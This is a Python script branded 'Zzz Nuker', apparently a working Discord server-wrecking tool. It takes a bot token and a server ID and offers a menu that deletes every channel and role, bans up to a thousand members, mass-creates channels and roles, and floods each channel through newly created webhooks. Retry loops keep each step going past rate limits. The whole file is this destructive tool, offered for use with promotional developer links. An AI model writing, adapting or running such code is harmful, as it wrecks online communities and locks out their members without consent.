import os, asyncio, aiohttp, sys, random, time
from datetime import datetime
from colorama import Fore , Style
from packaging import version
from datetime import datetime, timezone

try:
    from pystyle import Colorate, Write, System, Colors, Center, Anime
    import requests
except:
    os.system('pip install pystyle')
    os.system('pip install requests')

# import ctypes

# def set_console_title(title):
#     ctypes.windll.kernel32.SetConsoleTitleW(title)

# set_console_title("Zzz Nuker | .GG/REXA")   

    
__VERSION__ = '1.7382047493'  
async def fetchname(pbin):
    async with aiohttp.ClientSession() as session:
        async with session.get(pbin) as response:
            if response.status == 200:
                webname = await response.text() 
                return webname.strip()  
            else:
                print(f"{response.status}")
                return None

try:
    os.system('cls')
        
except:
    os.system('clear')



def purplepink(text):
    os.system(""); faded = ""
    red = 120
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

def yellowred(text):
    os.system("") 
    faded = ""
    green = 255 
    
    for line in text.splitlines():
        faded += f"\033[38;2;255;{green};0m{line}\033[0m\n"
        if green > 0:
            green -= 15  
            if green < 0:
                green = 0  

    return faded 



uwuaizer = """

███████ ███████ ███████ 
   ███     ███     ███  
  ███     ███     ███   
 ███     ███     ███    
███████ ███████ ███████ 
                        """

logo = Center.XCenter(uwuaizer)
print(yellowred(logo))
    
def get_token():
    global token
    token = input("\033[38;2;255;225;0mT\033[0m\033[38;2;255;235;0mo\033[0m\033[38;2;255;245;0mk\033[0m\033[38;2;255;255;0me\033[0m\033[38;2;255;205;0mn\033[0m\033[38;2;255;195;0m:\033[0m ")
    headers = {
        "Authorization": f"Bot {token}"
    }
    if not 'id' in requests.Session().get("https://discord.com/api/v10/users/@me", headers=headers).json():
        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mInvalid Token\033[0m")
        return get_token()
     
get_token()
guild_id = input("\033[38;2;255;225;0mG\033[0m\033[38;2;255;235;0mu\033[0m\033[38;2;255;245;0mi\033[0m\033[38;2;255;255;0ml\033[0m\033[38;2;255;205;0md\033[0m\033[38;2;255;195;0m \033[0m\033[38;2;255;185;0mI\033[0m\033[38;2;255;175;0md\033[0m\033[38;2;255;165;0m:\033[0m ")

headers = {
  "Authorization": f"Bot {token}"
}






async def create_channels(session,channel_name, type:int=0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mCreated Channel to {guild_id} - {channel_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Create Channel to {guild_id}")
            pass

async def create_roles(session,role_name):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': role_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mCreated Role to {guild_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Create Role to {guild_id}")
            pass

async def send_message(hook, message, amount: int):
    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            async with session.post(hook, json={'content': message, 'tts': False}) as response:
                if response.status == 429:  # Rate-limited
                    retry_after = (await response.json()).get('retry_after', 1)
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRate limited. Retrying after {retry_after} seconds.")
                    await asyncio.sleep(retry_after)
                elif response.status in [200, 201, 204]:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mMessage sent successfully!")
                else:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mFailed to send message with status {response.status}.")
            
            
async def WebhookSpam(session, channel_id, webname, msg_amt: int, msg, headers):
    try:
        async with session.post(
            f'https://discord.com/api/v9/channels/{channel_id}/webhooks', 
            headers=headers, 
            json={'name': webname}
        ) as r:
            if r.status == 429:  # Rate-limited
                retry_after = (await r.json()).get('retry_after', 1)
                print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited. Retrying after {retry_after} seconds.")
                await asyncio.sleep(retry_after)
            elif r.status in [200, 201, 204]:
                print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mWebhook '{webname}' created for channel {channel_id}.")
                webhook_raw = await r.json()
                webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                
                await asyncio.gather(send_message(webhook, msg, msg_amt))
            else:
                print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mFailed to create webhook with status {r.status}.")
    except aiohttp.ClientError as e:
        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mError creating webhook: {str(e)}")
    except Exception as e:
        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mUnexpected error: {str(e)}")
        
        
async def get_roles():
   
    roleIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
       
             m = await r.json()
             for role in m:
                roleIDS.append(role["id"])
            
    except TypeError:
        print("SUS RATELIMTED...!")
         
    return roleIDS

async def get_channels():
   
    channelIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
       
             m = await r.json()
             for channel in m:
                 channelIDS.append(channel["id"])
            
    except TypeError:
        print("SUS RATELIMTED...!")
         
    return channelIDS
    
    
async def get_members():
   
    memberIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
       
             m = await r.json()
             for member in m:
                memberIDS.append(member["user"]["id"])
            
    except TypeError:
        print("SUS RATELIMTED...!")
         
    return memberIDS

async def ban_members(session, member_id:str):
    while True:
        try:
            async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mBanned Member {member_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Ban Member {member_id}")

async def delete_channels(session, channel_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mDeleted Channel {channel_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Delete Channel {channel_id}")

async def delete_role(session, role_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mDeleted Role {role_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Delete Role {role_id}")

def slow_write(text):
    for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.0005)
async def main():
    try:
        os.system('cls')
        
    except:
        os.system('clear')
        
    logo = Center.XCenter(uwuaizer)
    time.sleep(0.0002)
    #print(Colorate.Vertical(Colors.red_to_purple, logo))
    print(yellowred(logo), end='')
    slow_write(Center.XCenter(f"""
                                                \033[38;2;255;225;0m> D\033[0m\033[38;2;255;235;0me\033[0m\033[38;2;255;245;0mv\033[0m \033[38;2;255;255;0m:\033[0m \033[38;2;255;205;0m@\033[0m\033[38;2;255;195;0ma\033[0m\033[38;2;255;185;0me\033[0m\033[38;2;255;175;0ms\033[0m\033[38;2;255;165;0mt\033[0m\033[38;2;255;155;0mh\033[0m\033[38;2;255;145;0me\033[0m\033[38;2;255;135;0mt\033[0m\033[38;2;255;125;0mi\033[0m\033[38;2;255;115;0mc\033[0m\033[38;2;255;105;0m.\033[0m\033[38;2;255;95;0ma\033[0m\033[38;2;255;85;0mi\033[0m\033[38;2;255;75;0mz\033[0m\033[38;2;255;65;0me\033[0m\033[38;2;255;55;0mr\033[0m
                                                \033[38;2;255;225;0m> S\033[0m\033[38;2;255;235;0mu\033[0m\033[38;2;255;245;0mp\033[0m\033[38;2;255;255;0mp\033[0m\033[38;2;255;205;0mo\033[0m\033[38;2;255;195;0mr\033[0m\033[38;2;255;185;0mt\033[0m \033[38;2;255;175;0m:\033[0m \033[38;2;255;165;0md\033[0m\033[38;2;255;155;0mi\033[0m\033[38;2;255;145;0ms\033[0m\033[38;2;255;135;0mc\033[0m\033[38;2;255;125;0mo\033[0m\033[38;2;255;115;0mr\033[0m\033[38;2;255;105;0md\033[0m\033[38;2;255;95;0m.\033[0m\033[38;2;255;85;0mg\033[0m\033[38;2;255;75;0mg\033[0m\033[38;2;255;65;0m/\033[0m\033[38;2;255;55;0mr\033[0m\033[38;2;255;45;0me\033[0m\033[38;2;255;35;0mx\033[0m\033[38;2;255;25;0ma\033[0m
                                                \033[38;2;255;225;0m> Y\033[0m\033[38;2;255;235;0mT\033[0m \033[38;2;255;245;0m:\033[0m \033[38;2;255;255;0m@\033[0m\033[38;2;255;205;0mn\033[0m\033[38;2;255;195;0mu\033[0m\033[38;2;255;185;0mk\033[0m\033[38;2;255;175;0me\033[0m\033[38;2;255;165;0mr\033[0m\033[38;2;255;155;0ms\033[0m\033[38;2;255;145;0mo\033[0m\033[38;2;255;135;0mp\033[0m
                                                \033[38;2;255;225;0m> G\033[0m\033[38;2;255;235;0mi\033[0m\033[38;2;255;245;0mt\033[0m\033[38;2;255;255;0mh\033[0m\033[38;2;255;205;0mu\033[0m\033[38;2;255;195;0mb\033[0m \033[38;2;255;185;0m:\033[0m \033[38;2;255;175;0mA\033[0m\033[38;2;255;165;0mx\033[0m\033[38;2;255;155;0mZ\033[0m\033[38;2;255;145;0me\033[0m\033[38;2;255;135;0mr\033[0m\033[38;2;255;125;0mX\033[0m\033[38;2;255;115;0mD\033[0m\n
"""))
    print(Center.XCenter(f"""                                  
                          \033[38;2;255;0;205m╔══════════════════════════════╦═══════════════════════════════╗\033[0m
                          \033[38;2;255;0;180m║   \033[37mVersion: {version.parse(__VERSION__)}      \033[38;2;255;0;180m║   \033[37mDev: AiZeR /Rexa          \033[38;2;255;0;180m  ║
                          \033[38;2;255;0;155m╚══════════════════════════════╩═══════════════════════════════╝\033[0m
                 \033[38;2;255;0;130m╔══════════════════════════╦══════════════════════════╦════════════════════════╗\033[0m
                 \033[38;2;255;0;105m║   \033[37m[1] Delete Channels    \033[38;2;255;0;105m║    \033[37m[2] Delete Roles      \033[38;2;255;0;105m║    \033[37m[3] Ban Members     \033[38;2;255;0;105m║\033[0m
                 \033[38;2;255;0;80m╠══════════════════════════╬══════════════════════════╬════════════════════════╣\033[0m
                 \033[38;2;255;0;55m║   \033[37m[4] Create Channels    \033[38;2;255;0;55m║    \033[37m[5] Create Roles      \033[38;2;255;0;55m║    \033[37m[6] Webhook Spam    \033[38;2;255;0;55m║\033[0m
                 \033[38;2;255;0;30m╚══════════════════════════╩══════════════════════════╩════════════════════════╝\033[0m             
    """))
    choose = input(Fore.LIGHTCYAN_EX+f"                                        > {Fore.RESET}")
    if choose == '1':
        channels = await get_channels()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_channels(session, channel_id) for channel_id in channels])
           #async with tasksio.TaskPool(20_000) as pool:
              # for channel_id in channels:
                   #await pool.put(delete_channels(session, channel_id))

        await asyncio.sleep(1)
        await main()
    
    elif choose == '2':
        roles = await get_roles()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_role(session, role_id) for role_id in roles])
           

        await asyncio.sleep(1)
        await main()
    
    elif choose == '4':
        chan_name = input(Fore.LIGHTCYAN_EX+"                                        Channel Name:  ")
        amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_channels(session, chan_name, 0) for i in range(amt)])
            
            
        await asyncio.sleep(1)
        await main() 

    elif choose == '6':

        webname = "Ran By .GG/REXA"
        web_msg = input(Fore.LIGHTCYAN_EX + "                                        Webhook Content:  ")
        msg_amt = int(input(Fore.LIGHTCYAN_EX + "                                        Amount of Messages:  "))
        channels = await get_channels()
        headers = {
            'Authorization': f"Bot {token}", 
            'Content-Type': 'application/json'
        }
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[WebhookSpam(session, channel_id, webname, msg_amt, web_msg, headers) for channel_id in channels])
        
        await asyncio.sleep(1)
        await main() 

    elif choose == '3':
        members = await get_members()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[ban_members(session, member_id) for member_id in members])
            
            
        await asyncio.sleep(1)
        await main()
        
    elif choose == '5':
        role_name = input(Fore.LIGHTCYAN_EX+"                                        Role Name:  ")
        amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_roles(session, role_name) for i in range(amt)])
            
            
        await asyncio.sleep(1)
        await main()
        
    else:
        await asyncio.sleep(1)
        await main()

if __name__ == "__main__":
    
    asyncio.run(main())
    
